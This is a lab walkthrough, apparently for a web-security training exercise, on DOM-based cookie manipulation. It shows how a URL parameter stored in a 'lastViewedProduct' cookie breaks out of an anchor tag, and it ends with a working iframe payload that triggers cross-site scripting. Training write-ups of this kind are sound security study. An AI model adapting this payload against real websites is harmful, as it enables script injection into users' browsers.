```bash

1. Open the lab
2. Click on View details of the product, then click on Last viewed product
3. Navigate to View Page Source and look for the <script> tag

<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>

EXPLAINATION
document.cookie = ... → Creates or updates a cookie in the browser

'lastViewedProduct=' + window.location → Stores the current page URL as the cookie value

SameSite=None → Allows the cookie to be sent with cross-site requests

Secure → Ensures the cookie is only sent over HTTPS connections

4. Try injecting a parameter into the URL
   https://0a6d008f04591f69862239f800320042.web-security-academy.net/product?productId=1&apple=apple

5. Open the Inspect tab, click on Storage, and then click on Cookies
6. We can see that the cookie appends our parameter

TEST CASE
a. Navigate to the burp HTTP history and look for the request

   <a href='https://0a6d008f04591f69862239f800320042.web-security-academy.net/product?productId=1&amp;apple=apple'>Last viewed product</a>

c. This indicates we can inject our data

5. Navigate to the Last viewd product and add try to break out of the anchor tag
	 https://0a6d008f04591f69862239f800320042.web-security-academy.net/product?productId=1&apple=apple'<script>print()</script>

6. And click on Last viewed product  --  XSS confirmed

PAYLOAD

<iframe src="https://0a6d008f04591f69862239f800320042.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a6d008f04591f69862239f800320042.web-security-academy.net';window.x=1;">


```
